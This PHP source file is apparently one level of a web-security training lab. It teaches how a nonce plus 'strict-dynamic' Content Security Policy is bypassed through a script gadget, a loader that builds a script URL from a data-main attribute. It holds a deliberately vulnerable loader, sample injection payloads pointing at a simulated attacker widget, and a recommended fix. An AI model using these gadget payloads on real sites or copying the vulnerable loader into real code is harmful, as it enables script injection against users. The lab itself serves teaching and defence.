<?php
require_once __DIR__ . '/helpers.php';

$L    = 10;
$meta = bp_levels()[$L];

$nonce  = bp_random_nonce();
$policy = bp_policy($L, $nonce);
$alt    = bp_alt_origin();

$payload = (string)($_POST['payload'] ?? '');
$flag    = '';
$result  = '';
$stages  = [];
$frame   = '';

if ($payload !== '') {
    $eval = csp_evaluate($policy, $payload, [
        'page_url'     => bp_render_url($L),
        'page_scripts' => [
            ['label' => "the page's own <script nonce src=\"loader.js\">", 'kind' => 'external',
             'src' => 'loader.js', 'nonce' => $nonce],
        ],
        'loader'       => true,   // loader.js is on the page and runs with the nonce
    ]);
    $stages = csp_stages($eval);

    // The effect: loader.js inserted a script from an origin the policy never
    // named, and strict-dynamic let it run.
    $gadget = null;
    foreach (csp_executed($eval, 'gadget') as $f) {
        if ($f['offorigin']) {
            $gadget = $f;
            break;
        }
    }

    $frame = bp_frame($L, ['i' => $payload],
        'loader.js runs with the page nonce and scans the document once it has parsed. Whatever it decides to '
        . 'insert is inserted by a trusted script, which is the only thing strict-dynamic cares about.');

    if ($gadget !== null) {
        $flag   = bp_flag($L);
        $result = bp_verdict(true,
            'loader.js inserted a script from <code>' . lk_esc($gadget['origin']) . '</code> and the browser ran it. '
            . 'That origin appears nowhere in the policy, and your markup carried no nonce.');
    } elseif (csp_executed($eval, 'gadget')) {
        $result = bp_verdict(false,
            'The loader picked up your attribute and the script ran, but it came from this page&rsquo;s own origin, '
            . 'so nothing has been proven yet. Point it somewhere that is not here.');
    } elseif ($eval['scan']['gadget_hosts']) {
        $result = bp_verdict(false,
            'The loader saw your attribute. Read the trace to see why the script it built was refused.');
    } else {
        $result = bp_verdict(false,
            'Nothing in that markup runs, and nothing in it is something the loader reads. The trace names the '
            . 'directive behind each refusal.');
    }
}

$code = <<<'PHP'
// The recommended strict policy: a per-response nonce plus
// 'strict-dynamic', which tells the browser to ignore host allowlists
// and trust what an already-trusted script inserts.
$nonce = bin2hex(random_bytes(9));

header("Content-Security-Policy: "
     . "default-src 'self'; "
     . "script-src 'nonce-$nonce' 'strict-dynamic'; "
     . "object-src 'none'; base-uri 'self'");

echo '<script nonce="' . $nonce . '" src="loader.js"></script>';
echo '<div id="note">' . $note . '</div>';

// --- loader.js, the storefront's module bootstrapper -----------------
function boot() {
    var el = document.querySelector('[data-main]');
    if (!el) return;
    var s = document.createElement('script');
    s.src = el.getAttribute('data-main');   // taken verbatim
    document.head.appendChild(s);
}
document.addEventListener('DOMContentLoaded', boot);
PHP;

$fixBad = <<<'PHP'
// policy
script-src 'nonce-...' 'strict-dynamic'
// gadget, running with that nonce
s.src = el.getAttribute('data-main');
document.head.appendChild(s);
PHP;

$fixGood = <<<'PHP'
// strict-dynamic delegates trust to your own scripts, so those scripts
// have to earn it. A loader must decide what to load from data it
// controls, never from the DOM it is standing in.
const MODULES = {
    cart:     '/app/cart.js',
    reviews:  '/app/reviews.js',
};

function boot() {
    const name = document.currentScript.dataset.module;   // set by the
    const url  = MODULES[name];                           // server, not
    if (!url) return;                                     // by the page
    const s = document.createElement('script');
    s.src = url;                     // a value from the map, never input
    document.head.appendChild(s);
}

// Where a loader genuinely has to take a URL, keep the host allowlist
// and drop 'strict-dynamic', or gate the value through a Trusted Types
// policy so the assignment to .src is checked at the sink.
PHP;

lk_page([
    'lab'        => bp_lab(),
    'level'      => $L,
    'title'      => $meta['title'],
    'difficulty' => $meta['difficulty'],
    'extra_head' => bp_extra_head(),

    'code'       => $code,
    'vuln_lines' => [8, 12, 19, 20],
    'annotation' => 'The policy is the recommended one and the nonce is unguessable. <code>&#39;strict-dynamic&#39;</code>
        extends the page&rsquo;s trust to whatever an allowlisted script inserts, and the page ships a loader that
        turns an attribute of arbitrary markup into a script URL.',

    'theory' => '<p><code>&#39;strict-dynamic&#39;</code> exists to solve a practical problem: a nonce cannot be
        attached to scripts that a loader creates at runtime, so nonce-only policies used to break bundlers,
        analytics tags and lazy-loaded modules. The directive says that a script which was itself allowed may insert
        further scripts, and those inherit the permission. Host and scheme sources in the same list are ignored
        entirely, which is what makes the policy immune to the gadget in level 6.</p>
        <p>The cost is that the trust boundary is no longer a list of URLs you can read off the header. It is the
        set of scripts that run on the page, and by extension every decision those scripts make about what to load.
        A loader that derives a URL from the DOM has handed that decision to whoever can write into the DOM.</p>
        <p>Two consequences are visible in the trace and worth keeping. A <code>&lt;script&gt;</code> tag written by
        the HTML parser is <em>not</em> covered by <code>&#39;strict-dynamic&#39;</code> &mdash; parser-inserted
        scripts still need the nonce, which is why injecting a script tag fails here. And a script inserted by
        trusted code is covered no matter where it points, which is why an attribute is enough. The directive is not
        weak; it relocates the thing you have to audit, from the header to the code.</p>',

    'fix' => [
        'bad'  => $fixBad,
        'good' => $fixGood,
        'lang' => 'js',
        'note' => 'The rule for a codebase running under <code>&#39;strict-dynamic&#39;</code>: no script URL may be
            derived from page content. Map a fixed key to a fixed URL, take configuration from a server-rendered
            attribute on the loader&rsquo;s own tag, and treat every assignment to <code>script.src</code> as a
            security boundary. Trusted Types enforces exactly that at the sink, which is why it pairs well with this
            policy.',
    ],

    'scenario' => '<strong>Scenario:</strong> the storefront moved to the policy every guide recommends. The nonce
        is cryptographic and per-response, host sources are gone, and the JSONP gadget from level 6 is dead. The
        note field is still written into the page as HTML, and the page still ships its module loader.
        <br><strong>Goal:</strong> run a script from an origin the policy never mentions.',

    'model' => [
        'title' => 'What strict-dynamic does to each kind of script',
        'html'  => '<table class="lk-kv">
            <tr><td>parser-inserted <code>&lt;script src&gt;</code></td><td>needs the nonce. Host sources are
                ignored, so there is no allowlist to fall back on.</td></tr>
            <tr><td>parser-inserted inline script</td><td>needs the nonce.</td></tr>
            <tr><td><code>onerror="…"</code> attribute</td><td>always blocked; handlers can never carry a nonce.</td></tr>
            <tr><td>script created by allowed script and appended</td><td><strong>runs</strong>, from any URL, with
                no nonce.</td></tr>
        </table>
        <p>The last row is the one to build on. <a href="loader.js" target="_blank">loader.js</a> is allowed, it runs
        after the document parses, and it reads <code>data-main</code> off the first element that has one.</p>
        <p>You need a URL your browser can reach on a different origin. This lab is
        <code>' . lk_esc(bp_self_origin()) . '</code>; the same server also answers on
        <code>' . lk_esc($alt) . '</code>, and <code>' . lk_esc($alt) . '/attacker/widget.js</code> exists and calls
        <code>hlab.win()</code>.</p>
        <div class="bp-policy">' . lk_esc($policy) . '</div>',
    ],

    'form'   => bp_markup_form($payload, 'Markup injected into the frame',
        '<div data-main="' . $alt . '/attacker/widget.js"></div>', 'Inject and render'),
    'result' => $result . $frame,
    'flag'   => $flag,
    'flag_msg' => 'Under strict-dynamic your policy includes every loader you ship.',
    'why'    => '<p>Read the two script decisions in the trace together. Anything you wrote as a
        <code>&lt;script&gt;</code> was refused, because parser-inserted scripts still need the nonce and
        <code>&#39;strict-dynamic&#39;</code> removed the host allowlist that might otherwise have saved them. The
        script that ran was not written by you at all &mdash; <code>loader.js</code> created it, and the browser
        allowed it because <code>loader.js</code> had a valid nonce.</p>
        <p>So the injection was not into script position. It was into a <em>data</em> position that a trusted script
        reads. That is the defining shape of a script gadget, and it is why gadget hunting is a code-reading
        exercise rather than a payload exercise: you are looking for places where application code turns page
        content into a URL, a template, or an element.</p>
        <p>You have now seen both halves of the modern advice fail for different reasons. Host allowlists fail
        because an allowlisted origin serves something reflective (level 6). Nonce plus
        <code>&#39;strict-dynamic&#39;</code> fails because the trusted code makes a decision from untrusted data
        (this level). Neither means the advice is wrong &mdash; it means CSP is a mitigation whose strength depends
        on the code underneath it, and the injection itself is still the bug to fix.</p>',

    'pipeline' => $stages,
    'probes'   => [
        'param'  => 'payload',
        'method' => 'POST',
        'action' => 'level10.php',
        'items'  => [
            ['q'       => 'Does the level-6 host gadget still work?',
             'payload' => '<script src="/jsonp.php?callback=hlab.win()//"></script>',
             'learn'   => 'A refusal, and the trace names <code>&#39;strict-dynamic&#39;</code> as the reason. Host '
                        . 'sources are ignored, so same-origin no longer means allowed.'],
            ['q'       => 'Is a parser-inserted script ever allowed here?',
             'payload' => '<script src="/loader.js"></script>',
             'learn'   => 'Even a file the page itself loads is refused without the nonce. That rules out the whole '
                        . 'category and points you at scripts the page inserts rather than ones you write.'],
            ['q'       => 'Does the loader read anything from the markup around it?',
             'payload' => '<div data-main="/app/widget.js"></div>',
             'learn'   => 'A same-origin module, so nothing dangerous happens. If the trace shows loader.js building '
                        . 'a script from your attribute, you have found the gadget without exploiting it.'],
        ],
    ],
    'hints' => bp_hints($L),
]);
